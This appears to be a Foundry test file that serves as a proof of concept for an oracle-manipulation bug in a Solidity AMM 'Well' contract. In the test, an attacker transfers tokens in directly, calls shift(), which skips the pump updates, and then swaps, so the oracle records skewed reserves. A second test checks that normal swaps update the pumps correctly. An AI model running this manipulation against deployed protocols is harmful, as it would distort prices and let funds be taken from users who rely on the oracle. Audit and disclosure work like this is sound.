// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Well} from "src/Well.sol";
import {Aquifer} from "src/Aquifer.sol";
import {IWellFunction} from "src/interfaces/IWellFunction.sol";
import {IPump} from "src/interfaces/pumps/IPump.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";
import {ERC20} from "oz/token/ERC20/ERC20.sol";

/**
 * @title MockERC20
 * @dev Simple ERC20 token for testing
 */
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**18);
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/**
 * @title MockWellFunction
 * @dev Mock implementation of constant product well function for testing
 */
contract MockWellFunction is IWellFunction {
    function calcLpTokenSupply(
        uint256[] calldata reserves,
        bytes calldata
    ) external pure returns (uint256 lpTokenSupply) {
        // Simple constant product: sqrt(x * y)
        if (reserves.length != 2) revert();
        lpTokenSupply = sqrt(reserves[0] * reserves[1]);
    }

    function calcReserve(
        uint256[] calldata reserves,
        uint256 j,
        uint256 lpTokenSupply,
        bytes calldata
    ) external pure returns (uint256 reserve) {
        // Constant product: x * y = k
        if (reserves.length != 2) revert();
        uint256 k = lpTokenSupply * lpTokenSupply;
        uint256 i = j == 0 ? 1 : 0;
        reserve = k / reserves[i];
    }

    function calcLPTokenUnderlying(
        uint256 lpTokenAmount,
        uint256[] calldata reserves,
        uint256 lpTokenSupply,
        bytes calldata
    ) external pure returns (uint256[] memory tokenAmounts) {
        tokenAmounts = new uint256[](reserves.length);
        for (uint256 i = 0; i < reserves.length; i++) {
            tokenAmounts[i] = (reserves[i] * lpTokenAmount) / lpTokenSupply;
        }
    }

    function sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }

    function name() external pure returns (string memory) {
        return "MockWellFunction";
    }

    function symbol() external pure returns (string memory) {
        return "MWF";
    }
}

/**
 * @title MockPump
 * @dev Mock pump that records reserve updates for testing oracle manipulation
 */
contract MockPump is IPump {
    struct Update {
        uint256[] reserves;
        uint256 timestamp;
        uint256 blockNumber;
    }
    
    Update[] public updates;
    
    function update(uint256[] calldata reserves, bytes calldata) external {
        uint256[] memory reservesCopy = new uint256[](reserves.length);
        for (uint256 i = 0; i < reserves.length; i++) {
            reservesCopy[i] = reserves[i];
        }
        updates.push(Update({
            reserves: reservesCopy,
            timestamp: block.timestamp,
            blockNumber: block.number
        }));
    }
    
    function getUpdateCount() external view returns (uint256) {
        return updates.length;
    }
    
    function getUpdate(uint256 index) external view returns (uint256[] memory, uint256, uint256) {
        require(index < updates.length, "Index out of bounds");
        return (updates[index].reserves, updates[index].timestamp, updates[index].blockNumber);
    }
}

/**
 * @title OracleManipulationExploitTest
 * @dev Demonstrates oracle manipulation via shift() bypassing pump updates
 */
contract OracleManipulationExploitTest is Test {
    Well public well;
    Aquifer public aquifer;
    MockERC20 public token0;
    MockERC20 public token1;
    MockWellFunction public wellFunction;
    MockPump public pump;
    
    address public attacker;
    address public victim;
    
    uint256 constant INITIAL_LIQUIDITY = 1000 * 10**18;
    
    function setUp() public {
        // Deploy contracts
        aquifer = new Aquifer();
        token0 = new MockERC20("Token0", "TKN0");
        token1 = new MockERC20("Token1", "TKN1");
        wellFunction = new MockWellFunction();
        pump = new MockPump();
        
        // Setup accounts
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        // Prepare well initialization data
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(token0));
        tokens[1] = IERC20(address(token1));
        
        Well.Call memory wellFunctionCall = Well.Call({
            target: address(wellFunction),
            data: ""
        });
        
        Well.Call[] memory pumps = new Well.Call[](1);
        pumps[0] = Well.Call({
            target: address(pump),
            data: ""
        });
        
        // Deploy well via aquifer
        well = Well(
            aquifer.boreWell(
                address(new Well()),
                tokens,
                wellFunctionCall,
                pumps,
                bytes32(uint256(1))
            )
        );
        
        // Initialize well with liquidity
        token0.mint(address(this), INITIAL_LIQUIDITY * 10);
        token1.mint(address(this), INITIAL_LIQUIDITY * 10);
        
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = INITIAL_LIQUIDITY;
        amounts[1] = INITIAL_LIQUIDITY;
        
        well.addLiquidity(amounts, 0, address(this), type(uint256).max);
        
        // Fund attacker
        token0.mint(attacker, INITIAL_LIQUIDITY * 2);
        token1.mint(attacker, INITIAL_LIQUIDITY * 2);
        
        vm.startPrank(attacker);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        vm.stopPrank();
    }
    
    /**
     * @dev Demonstrates oracle manipulation through shift() function
     * 
     * Attack Flow:
     * 1. Attacker transfers tokens directly to Well to create imbalanced reserves
     * 2. Attacker calls shift() which updates reserves WITHOUT updating pumps
     * 3. Attacker performs swap which triggers pump update with manipulated reserves
     * 4. Pump now contains manipulated price data
     * 5. Attacker reverses manipulation to extract funds
     */
    function testOracleManipulationViaShift() public {
        console.log("=== Oracle Manipulation via shift() Exploit ===");
        
        // Record initial state
        uint256[] memory initialReserves = well.getReserves();
        console.log("Initial Reserve Token0:", initialReserves[0]);
        console.log("Initial Reserve Token1:", initialReserves[1]);
        console.log("Initial Pump Updates:", pump.getUpdateCount());
        
        // Move to next block to ensure clean state
        vm.roll(block.number + 1);
        
        vm.startPrank(attacker);
        
        // STEP 1: Manipulate reserves by transferring tokens directly to Well
        // This creates an imbalance without triggering pump updates
        uint256 manipulationAmount = INITIAL_LIQUIDITY / 2;
        console.log("\n[STEP 1] Transferring tokens directly to Well");
        console.log("Manipulation Amount:", manipulationAmount);
        
        token0.transfer(address(well), manipulationAmount);
        
        // Verify Well balance changed but reserves haven't been updated yet
        uint256 wellBalance0 = token0.balanceOf(address(well));
        console.log("Well Token0 Balance:", wellBalance0);
        console.log("Stored Reserve Token0:", initialReserves[0]);
        
        // STEP 2: Call shift() to update reserves WITHOUT updating pumps
        // This is the vulnerability - shift() modifies reserves but doesn't call _updatePumps()
        console.log("\n[STEP 2] Calling shift() to update reserves without pump update");
        
        uint256 pumpUpdatesBefore = pump.getUpdateCount();
        uint256 shiftAmount = well.shift(IERC20(address(token1)), 0, attacker);
        uint256 pumpUpdatesAfter = pump.getUpdateCount();
        
        console.log("Shift Amount Received:", shiftAmount);
        console.log("Pump Updates Before shift():", pumpUpdatesBefore);
        console.log("Pump Updates After shift():", pumpUpdatesAfter);
        
        // Verify reserves were updated but pumps were NOT
        uint256[] memory reservesAfterShift = well.getReserves();
        console.log("Reserve Token0 After shift():", reservesAfterShift[0]);
        console.log("Reserve Token1 After shift():", reservesAfterShift[1]);
        
        // CRITICAL: Pumps were NOT updated during shift()
        assertEq(pumpUpdatesAfter, pumpUpdatesBefore, "Pumps should NOT be updated by shift()");
        
        // STEP 3: Perform swap to trigger pump update with manipulated reserves
        console.log("\n[STEP 3] Performing swap to trigger pump update");
        
        uint256 swapAmount = 1 * 10**18;
        uint256 pumpUpdatesBeforeSwap = pump.getUpdateCount();
        
        well.swapFrom(
            IERC20(address(token0)),
            IERC20(address(token1)),
            swapAmount,
            0,
            attacker,
            type(uint256).max
        );
        
        uint256 pumpUpdatesAfterSwap = pump.getUpdateCount();
        console.log("Pump Updates Before Swap:", pumpUpdatesBeforeSwap);
        console.log("Pump Updates After Swap:", pumpUpdatesAfterSwap);
        
        // VULNERABILITY DEMONSTRATED: Pump was updated with manipulated reserves
        assertEq(pumpUpdatesAfterSwap, pumpUpdatesBeforeSwap + 1, "Pump should be updated by swap");
        
        // Retrieve the manipulated pump data
        (uint256[] memory manipulatedReserves, uint256 timestamp, uint256 blockNum) = pump.getUpdate(pumpUpdatesAfterSwap - 1);
        console.log("\n[EXPLOIT SUCCESS] Pump recorded manipulated reserves:");
        console.log("Manipulated Reserve Token0:", manipulatedReserves[0]);
        console.log("Manipulated Reserve Token1:", manipulatedReserves[1]);
        console.log("Timestamp:", timestamp);
        console.log("Block Number:", blockNum);
        
        // Calculate price manipulation
        uint256 initialPrice = (initialReserves[1] * 10**18) / initialReserves[0];
        uint256 manipulatedPrice = (manipulatedReserves[1] * 10**18) / manipulatedReserves[0];
        
        console.log("\n[IMPACT ANALYSIS]");
        console.log("Initial Price (Token1/Token0):", initialPrice);
        console.log("Manipulated Price (Token1/Token0):", manipulatedPrice);
        
        uint256 priceDeviation = manipulatedPrice > initialPrice 
            ? ((manipulatedPrice - initialPrice) * 100) / initialPrice
            : ((initialPrice - manipulatedPrice) * 100) / initialPrice;
        console.log("Price Deviation:", priceDeviation, "%");
        
        // Verify significant price manipulation occurred
        assertTrue(priceDeviation > 10, "Price should be significantly manipulated");
        
        vm.stopPrank();
        
        console.log("\n=== Exploit Complete ===");
        console.log("The pump (oracle) now contains manipulated price data");
        console.log("Any protocol relying on this oracle can be exploited");
    }
    
    /**
     * @dev Demonstrates that normal operations correctly update pumps BEFORE reserve changes
     */
    function testNormalSwapUpdatesPumpsCorrectly() public {
        console.log("=== Normal Swap Pump Update (Expected Behavior) ===");
        
        vm.roll(block.number + 1);
        
        uint256[] memory initialReserves = well.getReserves();
        console.log("Initial Reserve Token0:", initialReserves[0]);
        console.log("Initial Reserve Token1:", initialReserves[1]);
        
        uint256 pumpUpdatesBefore = pump.getUpdateCount();
        
        vm.prank(attacker);
        well.swapFrom(
            IERC20(address(token0)),
            IERC20(address(token1)),
            10 * 10**18,
            0,
            attacker,
            type(uint256).max
        );
        
        uint256 pumpUpdatesAfter = pump.getUpdateCount();
        
        // Pump should be updated with PRE-SWAP reserves
        (uint256[] memory recordedReserves,,) = pump.getUpdate(pumpUpdatesAfter - 1);
        
        console.log("\nPump recorded reserves (should match initial):");
        console.log("Recorded Reserve Token0:", recordedReserves[0]);
        console.log("Recorded Reserve Token1:", recordedReserves[1]);
        
        // Verify pump recorded the correct pre-swap state
        assertEq(recordedReserves[0], initialReserves[0], "Pump should record pre-swap reserve0");
        assertEq(recordedReserves[1], initialReserves[1], "Pump should record pre-swap reserve1");
        
        console.log("\n=== Normal behavior verified ===");
    }
}
